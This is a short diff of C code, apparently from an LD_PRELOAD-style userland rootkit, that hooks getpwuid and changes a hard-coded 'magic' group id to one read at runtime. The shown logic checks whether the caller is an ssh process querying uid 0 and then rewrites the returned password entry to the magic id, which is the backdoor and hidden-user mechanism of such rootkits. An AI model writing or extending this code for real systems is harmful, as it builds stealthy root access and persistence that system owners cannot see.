@@ -16,7 +16,7 @@ struct passwd *getpwuid(uid_t uid){
     gid_t magicgid = readgid();
     if(uid == magicgid) return call(CGETPWUID, 0);
 
-    if(getgid() == MAGIC_GID && uid == 0 && process("ssh")){
+    if(getgid() == magicgid && uid == 0 && process("ssh")){
         struct passwd *bpw = call(CGETPWUID, uid);
 
         bpw->pw_uid = magicgid;
